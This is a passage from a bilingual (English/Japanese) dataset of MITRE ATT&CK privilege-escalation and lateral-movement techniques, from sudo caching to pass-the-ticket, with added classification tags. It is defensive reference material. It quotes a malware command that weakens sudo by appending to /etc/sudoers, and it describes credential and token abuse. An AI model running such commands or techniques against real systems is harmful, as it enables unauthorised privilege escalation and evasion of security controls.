UACは単一システム向けセキュリティ機構であるため、管理者権限を持つアカウントの認証情報が判明している場合、横方向移動技術を用いた別の回避が可能である。リモートシステム上では、あるシステムで実行中のプロセスの権限や整合性は不明であり、デフォルトで高整合性として扱われるためである。(引用元: SANS UAC Bypass),privilege-escalation;defense-evasion,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0005,attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073,2020-01-30T14:24:34.977Z,2025-04-16T20:37:15.662Z,,,,
T1548.003,T1548,Sudo and Sudo Caching,sudo と sudo キャッシュ,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges. Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.""(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again). The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though. Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user. In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.","攻撃者はsudoキャッシュを実行したり、sudoersファイルを利用して特権を昇格させることがある。これにより他のユーザーとしてコマンドを実行したり、より高い特権を持つプロセスを生成する。LinuxおよびMacOSシステムにおいて、sudo（""superuser do""とも呼ばれる）はユーザーがターミナルから昇格された特権でコマンドを実行することを可能にし、システム上でこれらのコマンドを実行できる者を制御する。 <code>sudo</code>コマンドは「システム管理者が権限を委譲し、特定のユーザー（またはユーザーグループ）にrootまたは他のユーザーとして一部（または全ての）コマンドを実行する権限を与えつつ、コマンドとその引数の監査証跡を提供する」ことを可能にします。(引用元: sudo マニュアルページ 2018)sudo はシステム管理者のために設計されているため、<code>timestamp_timeout</code> などの便利な設定機能を備えています。これは、<code>sudo</code> の実行間隔（分単位）で、この時間が経過するとパスワードの再入力を要求するものです。これは、<code>sudo</code> が一定期間認証情報をキャッシュする機能を持つためです。 sudo は、このタイムアウトを決定するために、<code>/var/db/sudo</code> に sudo が最後に実行された時刻のタイムスタンプを持つファイルを作成（または更新）します。 さらに、<code>tty_tickets</code>変数は各新規tty（ターミナルセッション）を独立して扱います。つまり、例えばあるttyのsudoタイムアウトが別のttyに影響することはありません（パスワードの再入力が必要になります）。sudoersファイル<code>/etc/sudoers</code>は、どのユーザーがどのコマンドをどの端末から実行できるかを記述します。 また、ユーザーが他のユーザーやグループとして実行できるコマンドも記述されます。これにより最小権限の原則が提供され、ユーザーはほとんどの時間を可能な限り低い権限で実行し、必要に応じて（通常はパスワード入力を促すことで）他のユーザーや権限に昇格します。ただし、sudoersファイルでは<code>user1 ALL=(ALL) NOPASSWD: ALL</code>のような行で、ユーザーにパスワード入力を求めない場合を指定することもできます。(引用元: OSX.Dok Malware) ただし、このファイルを編集するには昇格された権限が必要です。攻撃者は、これらのメカニズムの不適切な設定を悪用し、ユーザーのパスワードを必要とせずに権限を昇格させることも可能です。例えば、<code>/var/db/sudo</code>のタイムスタンプを監視し、それが<code>timestamp_timeout</code>の範囲内かどうかを確認できます。 この条件を満たせば、マルウェアはユーザーのパスワードを要求されずにsudoコマンドを実行できます。さらに、<code>tty_tickets</code>が無効化されている場合、攻撃者はそのユーザーの任意のttyからこの操作を実行可能です。実環境では、マルウェアが<code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>を発行して<code>tty_tickets</code>を無効化し、スクリプト処理を容易にしている事例が確認されています。(引用元: cybereason osx proton) この変更を反映させるため、マルウェアは<code>killall Terminal</code>も発行した。macOS Sierra以降、sudoersファイルでは<code>tty_tickets</code>がデフォルトで有効化されている。",privilege-escalation;defense-evasion,Linux;macOS,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0005,attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0,2020-01-30T14:34:44.992Z,2025-04-25T14:45:52.996Z,,,,
T1548.004,T1548,Elevated Execution with Prompt,昇格実行（プロンプト付き）,"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges. Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",攻撃者は<code>AuthorizationExecuteWithPrivileges</code> APIを悪用し、ユーザーに認証情報を要求することで権限昇格を図ることがあります。(引用元: AppleDocs AuthorizationExecuteWithPrivileges) このAPIの目的は、アプリケーション開発者がアプリケーションのインストールや更新など、root権限を必要とする操作を容易に実行できるようにすることです。 このAPIは、root権限を要求するプログラムが信頼できるソースからのものであるか、悪意を持って改変されていないかを検証しません。このAPIは非推奨ですが、macOSの最新リリースでも完全に機能します。このAPIを呼び出す際、ユーザーは認証情報の入力を求められますが、プログラムの起源や完全性に関するチェックは行われません。APIを呼び出すプログラムは、昇格された権限で悪意のある動作を実行するように改変可能な、世界書き込み可能なファイルをロードすることもあります。 攻撃者は<code>AuthorizationExecuteWithPrivileges</code>を悪用し、被害者に悪意のあるソフトウェアをインストールしたり永続化メカニズムを配置したりするためにルート権限を取得する可能性があります。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer 2019年2月)(引用: OSX Coldroot RAT) この手法は[Masquerading](https://attack.mitre.org/techniques/T1036)と組み合わせて、ユーザーを騙し悪意あるコードに昇格した権限を付与させる可能性があります。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer 2019年2月) この手法は、マシン上に存在するこのAPIを利用する正規プログラムを改変することで機能することも実証されている。(引用: Death by 1000 installers; it's all broken!),privilege-escalation;defense-evasion,macOS,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0005,attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0,2020-01-30T14:40:20.187Z,2025-04-16T20:37:19.503Z,,,,
T1548.005,T1548,Temporary Elevated Cloud Access,一時的な昇格されたクラウドアクセス,"Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023) Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles) While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation) **Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",攻撃者は、クラウドリソースへの一時的な昇格アクセス権を取得できる権限設定を悪用する可能性があります。多くのクラウド環境では、管理者がユーザーまたはサービスアカウントに対し、ロールへのジャストインタイムアクセス要求、他のアカウントのなりすまし、リソースやサービスへのロールの継承、あるいは自身の権限とは異なる一連の特権への短期アクセス権限を付与できます。 ジャストインタイムアクセスは、クラウドアカウントに追加のロールを細分化された一時的な方法で付与する仕組みです。これにより、アカウントは日常業務に必要な権限のみで動作し、必要に応じて追加の権限を要求できます。ジャストインタイムアクセス要求は、手動承認を必要とするように設定される場合もあれば、必要な権限が自動的に付与される場合もあります。(引用元: Azure Just in Time Access 2023)アカウントのなりすましは、ユーザーまたはサービスアカウントが一時的に別のアカウントの権限で動作することを可能にします。例えば、GCPでは`iam.serviceAccountTokenCreator`ロールを持つユーザーは、サービスアカウントの権限で一時的なアクセストークンを作成したり、任意のペイロードに署名したりできます。一方、ドメイン全体の委任権限を持つサービスアカウントは、Google Workspaceアカウントのなりすましを許可されています。(引用元: Google Cloud Service Account Authentication Roles)(引用元: Hunters Domain Wide Delegation Google Workspace 2023)(引用元: Google Cloud Just in Time Access 2023)(引用元: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) Exchange Onlineでは、`ApplicationImpersonation`ロールによりサービスアカウントが指定ユーザーアカウントの権限を利用可能になります。(引用元: Microsoft Impersonation and EWS in Exchange)多くのクラウド環境では、ユーザーがリソースにロールを渡し、タスクの実行や他サービスへの認証を可能にする仕組みも備えています。リソースを作成したユーザーは、そのリソースに渡したロールを直接引き継ぐわけではありませんが、付与された権限で特定のアクションを実行するようリソースを設定するなど、ロールのアクセス権を活用できる場合があります。 AWSでは`PassRole`権限を持つユーザーが作成したサービスに特定のロールを付与でき、GCPでは`iam.serviceAccountUser`ロールを持つユーザーがリソースにサービスアカウントを紐付けられます。(引用元: AWS PassRole)(引用元: Google Cloud Service Account Authentication Roles) これらの機能利用には特定のロール割り当てが必要ですが、クラウド管理者が権限設定を誤る可能性があります。 これにより、攻撃者が当初の意図を超えたリソースへのアクセス権を取得できる権限昇格経路が生じる可能性があります。(引用: Rhino Google Cloud Privilege Escalation)(引用: Rhino Security Labs AWS Privilege Escalation) **注:** この手法は、既存の権限構造を悪用して一時的にリソースへのアクセス権を昇格させるものではなく、アカウントに永続的なロールを割り当てる [追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003) とは異なります。 ただし、十分な特権を持つアカウントを侵害した攻撃者は、自身が制御する別のアカウントに[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を付与することで、これらの機能も悪用できる可能性があります。 これは、特にロールのなりすましがいつ発生しているかがログで明確にならない場合、特権の高いアカウントを直接使用する場合よりも、より高いステルス性を可能にする可能性があります。（引用元：CrowdStrike StellarParticle 2022年1月）,privilege-escalation;defense-evasion,IaaS;Office Suite;Identity Provider,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;email_infrastructure;cloud_control_plane;saas_in_use;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0005,attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c,2023-07-10T16:37:15.672Z,2025-04-15T23:15:17.608Z,,,,
T1548.006,T1548,TCC Manipulation,TCC操作,"Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA). When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC) Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)",攻撃者は、悪意のある実行ファイルに昇格された権限を付与するために、透明性・同意・制御（TCC）サービスまたはデータベースを操作または悪用できます。TCCは、画面共有、カメラ、マイク、フルディスクアクセス（FDA）など、TCCによって保護されているデータやサービスへのアクセス権限を実行中のプロセスが有しているかどうかを判断するために使用される、macOSのプライバシーとセキュリティ制御メカニズムです。 アプリケーションがTCCで保護されたデータやサービスへのアクセスを要求すると、TCCデーモン（`tccd`）は`/Library/Application Support/com.apple.TCC/TCC.db`（および`~/`の同等ディレクトリ）にあるTCCデータベースと（MDM接続時は）オーバーライトファイルを照合し、既存の権限を確認します。 権限が存在しない場合、ユーザーに許可の付与が求められます。権限が付与されると、データベースにアプリケーションの権限が保存され、リセットされない限り再度ユーザーに確認は行われません。 例えば、ウェブブラウザがユーザーのウェブカメラへのアクセス権限を要求した場合、一度許可されると、ウェブブラウザはユーザーに再度明示的に要求することはありません。(引用元: welivesecurity TCC)攻撃者は、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055) を通じて以前に許可されたアプリケーションを悪用したり、別のアプリケーションを使用して悪意のあるバイナリを実行したりすることで、TCCによって保護されている制限付きデータやサービスにアクセスする可能性があります。 例えば、攻撃者は macOS ネイティブアプリで FDA 権限を持つ Finder を利用して、悪意のある [AppleScript](https://attack.mitre.org/techniques/T1059/002) を実行できます。 Finderアプリ下で実行される悪意のある[AppleScript](https://attack.mitre.org/techniques/T1059/002)は、ユーザープロンプトを必要とせずシステム上の全ファイルへのアクセス権を継承します。システム整合性保護（SIP）が無効化されている場合、TCCの保護機能も無効化されます。 SIPが有効化されていないシステムでは、攻撃者は環境変数と[Launchctl](https://attack.mitre.org/techniques/T1569/001)を使用して攻撃者が制御するTCCデータベースをロードすることで、TCCデータベースを操作し、悪意のある実行ファイルに権限を追加できます。（引用元: TCC macOS bypass）（引用元: TCC Database）,defense-evasion;privilege-escalation,macOS,script_command_execution,privilege_gain,identity_federation;privileged_account;user_interaction;endpoint_execution;endpoint_management;file_storage_access;database_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--e8a0a025-3601-4755-abfb-8d08283329fb,2024-03-21T21:10:57.322Z,2025-04-15T23:14:58.393Z,,,,
T1550,,Use Alternate Authentication Material,代替認証情報の使用,"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA) Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",攻撃者は、パスワードハッシュ、Kerberosチケット、アプリケーションアクセストークンなどの代替認証材料を使用して、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。認証プロセスでは通常、有効な識別子（例：ユーザー名）に加えて、1つ以上の認証要素（例：パスワード、PIN、物理スマートカード、トークンジェネレータなど）が必要です。 代替認証材料は、ユーザーまたはアプリケーションが有効な識別子と必要な認証要素を提供して認証に成功した後、システムによって正当に生成される。代替認証材料は、識別子作成プロセス中に生成される場合もある。（引用元：NIST Authentication）（引用元：NIST MFA）代替認証材料をキャッシュすることで、システムはユーザーに認証要素の再入力を求めずに、識別子が正常に認証されたことを確認できる。 代替認証材料はシステムによって（メモリ上またはディスク上に）保持される必要があるため、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006) 技術による窃取リスクに晒される可能性がある。代替認証材料を窃取することで、攻撃者は平文パスワードや追加認証要素を知らなくても、システムアクセス制御を迂回しシステムへの認証が可能となる。,defense-evasion;lateral-movement,Windows;SaaS;IaaS;Containers;Identity Provider;Office Suite;Linux,credential_abuse,boundary_crossing,authentication_system;mfa_in_use;user_interaction;endpoint_execution;network_connectivity,specified,AD / Directory Server;Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0008,attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814,2020-01-30T16:18:36.873Z,2025-04-15T19:58:30.693Z,,,,
T1550.001,T1550,Application Access Token,アプリケーションアクセストークン,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials. Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta) For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017) Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured  Efor example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles) Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",攻撃者は盗んだアプリケーションアクセストークンを使用して、通常の認証プロセスを迂回し、リモートシステム上の制限付きアカウント、情報、サービスにアクセスする可能性があります。これらのトークンは通常、ユーザーやサービスから盗まれ、ログイン認証情報の代わりに使用されます。アプリケーションアクセストークンは、ユーザーやサービスに代わって承認されたAPIリクエストを行うために使用され、クラウド、コンテナベースのアプリケーション、SaaS（Software-as-a-Service）のリソースへのアクセスに一般的に利用されます。(引用元: Auth0 - Why You Should Always Use Access Tokens to Secure APIs 2019年9月)OAuthは、システムへのアクセス権をユーザーに付与するトークンを発行する、一般的に実装されているフレームワークの一つです。これらのフレームワークは連携してユーザーを検証し、ユーザーが実行を許可されているアクションを決定します。身元が確立されると、トークンにより、ユーザーの実際の認証情報を渡すことなくアクションの承認が可能になります。 したがって、トークンが侵害されると、悪意のあるアプリケーションを通じて攻撃者が他のサイトのリソースにアクセスできる可能性があります。(引用元: okta) 例えば、クラウドベースのメールサービスでは、悪意のあるアプリケーションにOAuthアクセストークンが付与されると、バックグラウンドアクセスを可能にする「リフレッシュ」トークンが付与された場合、ユーザーアカウントの機能への長期的なアクセス権を取得する可能性があります。（引用元：Microsoft Identity Platform Access 2019）OAuthアクセストークンを悪用すれば、攻撃者はユーザーが許可したREST APIを利用してメール検索や連絡先列挙などの機能を実行できる（引用元：Staaldraad Phishing with OAuth 2017）。侵害されたアクセストークンは、他のサービスを侵害する最初のステップとして利用される可能性がある。 たとえば、トークンによって被害者のプライマリメールへのアクセス権が付与された場合、攻撃者はパスワード忘れのルーチンをトリガーすることで、ターゲットが購読している他のすべてのサービスへのアクセス権を拡張できる可能性があります。 AWSおよびGCP環境では、攻撃者は別のユーザーアカウントの権限を持つ短命アクセストークンの要求をトリガーできます（引用元：Google Cloud Service Account Credentials）（引用元：AWS Temporary Security Credentials）。攻撃者はこのトークンを使用して、元のアカウントでは実行不可能なデータ要求や操作を実行できます。 この機能の権限設定が誤っている場合（例：全ユーザーが特定アカウントのトークンを要求可能）、攻撃者はクラウドアカウントへの初期アクセス権を取得したり、権限を昇格させたりできる可能性がある（引用元：Rhino Security Labs Enumerating AWS Roles）。トークンを介した直接APIアクセスは、第二認証要素の効果を無効化し、パスワード変更のような直感的な対策にも耐性を持つ可能性がある。 例えばAWS環境では、ユーザーのAWS API認証情報を侵害した攻撃者が`sts:GetFederationToken` API呼び出しを使用してフェデレーションユーザーセッションを作成できる可能性があります。このセッションは元のユーザーと同等の権限を持ち、元のユーザー認証情報が無効化されても存続し続ける可能性があります。（引用元：Crowdstrike AWS User Federation Persistence）さらに、APIチャネルを介したアクセス悪用は、正当なワークフローと整合性があるため、サービスプロバイダー側でも検出が困難な場合があります。,defense-evasion;lateral-movement,SaaS;Containers;IaaS;Office Suite;Identity Provider,credential_abuse,boundary_crossing,authentication_system;identity_federation;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0008,attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51,2020-01-30T17:37:22.261Z,2025-04-15T19:59:20.277Z,,,,
T1550.002,T1550,Pass the Hash,ハッシュのパス,"Adversaries may “pass the hash Eusing stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",攻撃者は盗んだパスワードハッシュを悪用し、「ハッシュパス」手法で環境内を横方向に移動し、通常のシステムアクセス制御を迂回する可能性があります。ハッシュパス（PtH）とは、ユーザーの平文パスワードにアクセスせずにユーザーとして認証する手法です。この手法は平文パスワードを必要とする標準的な認証ステップを迂回し、パスワードハッシュを使用する認証段階に直接移行します。 PtHを実行する際、使用中のアカウントの有効なパスワードハッシュは[Credential Access](https://attack.mitre.org/tactics/TA0006)技術を用いて取得される。取得したハッシュはPtHでそのユーザーとして認証するために使用される。認証後、PtHはローカルまたはリモートシステム上で操作を実行するために使用される可能性がある。 攻撃者は盗んだパスワードハッシュを「オーバーパス・ザ・ハッシュ」にも利用する可能性があります。 PtHと同様に、これはパスワードハッシュを使用してユーザーとして認証するだけでなく、そのパスワードハッシュを使用して有効なKerberosチケットを作成することも含まれます。このチケットはその後、[Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)攻撃を実行するために使用できます。（引用元: Stealthbits Overpass-the-Hash）,defense-evasion;lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;user_interaction;network_connectivity,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0008,attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e,2020-01-30T16:36:51.184Z,2025-04-16T20:37:22.508Z,,,,
T1550.003,T1550,Pass the Ticket,チケットのパス,"Adversaries may “pass the ticket Eusing stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system. When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket) A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks) A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014) Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",攻撃者は「チケットパス」を実行し、盗んだKerberosチケットを用いて環境内で横方向移動を行い、通常のシステムアクセス制御を迂回する可能性があります。チケットパス（PtT）とは、アカウントのパスワードにアクセスせずにKerberosチケットを用いてシステムに認証する手法です。Kerberos認証は、リモートシステムへの横方向移動の第一段階として利用される可能性があります。 PtTを実行する際、[有効なアカウント](https://attack.mitre.org/techniques/T1078)の有効なKerberosチケットは[OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)によって取得される。 